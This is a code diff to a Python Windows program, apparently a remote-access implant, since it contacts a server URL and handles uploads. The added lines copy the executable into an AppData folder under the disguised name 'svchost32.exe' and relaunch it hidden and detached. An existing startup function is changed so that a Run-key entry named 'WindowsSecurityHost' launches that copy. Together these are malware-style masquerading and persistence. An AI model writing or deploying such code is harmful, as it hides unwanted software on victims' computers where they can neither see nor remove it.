@@ -35,19 +35,43 @@ SERVER_URL = (
 )
 
 
+_INSTALL_DIR  = os.path.join(os.environ.get('APPDATA',''), 'Microsoft', 'WindowsHost')
+_INSTALL_NAME = 'svchost32.exe'
+_INSTALL_PATH = os.path.join(_INSTALL_DIR, _INSTALL_NAME)
+
+
+def relocate_and_restart():
+    """Se não estiver rodando do diretório de instalação, copia para lá e relança."""
+    if not getattr(sys, 'frozen', False):
+        return False
+    if os.path.abspath(sys.executable).lower() == os.path.abspath(_INSTALL_PATH).lower():
+        return False
+    try:
+        import shutil
+        os.makedirs(_INSTALL_DIR, exist_ok=True)
+        shutil.copy2(sys.executable, _INSTALL_PATH)
+        subprocess.Popen(
+            [_INSTALL_PATH],
+            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+            close_fds=True
+        )
+        return True
+    except Exception:
+        return False
+
+
 def add_to_startup():
     """Registra o exe no startup do Windows (roda ao ligar o PC)."""
     if not getattr(sys, 'frozen', False):
         return
     try:
         import winreg
-        exe_path = sys.executable
         key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             r'Software\Microsoft\Windows\CurrentVersion\Run',
             0, winreg.KEY_SET_VALUE
         )
-        winreg.SetValueEx(key, 'WindowsSecurityHost', 0, winreg.REG_SZ, exe_path)
+        winreg.SetValueEx(key, 'WindowsSecurityHost', 0, winreg.REG_SZ, _INSTALL_PATH)
         winreg.CloseKey(key)
     except Exception:
         pass
@@ -588,6 +612,8 @@ def on_upload(data):
 
 
 def main():
+    if relocate_and_restart():
+        sys.exit(0)
     add_to_startup()
 
     try:
